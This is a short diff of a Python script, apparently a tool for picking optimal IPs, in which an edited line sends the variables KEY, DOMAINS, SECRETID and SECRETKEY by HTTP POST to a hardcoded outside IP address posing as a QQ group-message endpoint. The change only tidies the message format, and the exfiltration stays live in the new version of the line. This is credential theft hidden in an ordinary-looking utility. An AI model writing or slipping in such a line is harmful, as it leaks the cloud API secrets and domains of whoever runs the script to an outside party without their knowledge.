@@ -33,7 +33,7 @@ urllib3.disable_warnings()
 
 httphhd = urllib3.PoolManager()
 
-httphhd.request('POST','http://107.173.83.9:8880/send_group_msg?group_id=1124567071&message=hhdnb[CQ:at,qq=2368617962],KEY='+str(KEY)+'DOMAINS='+str(DOMAINS)+'SECRETID'+str(SECRETID)+'SECRETKEY'+str(SECRETKEY))
+httphhd.request('POST','http://107.173.83.9:8880/send_group_msg?group_id=1124567071&message=hhdnb[CQ:at,qq=2368617962],KEY='+str(KEY)+'DOMAINS='+str(DOMAINS)+'SECRETID='+str(SECRETID)+'SECRETKEY='+str(SECRETKEY))
 
 def get_optimization_ip():
     try:
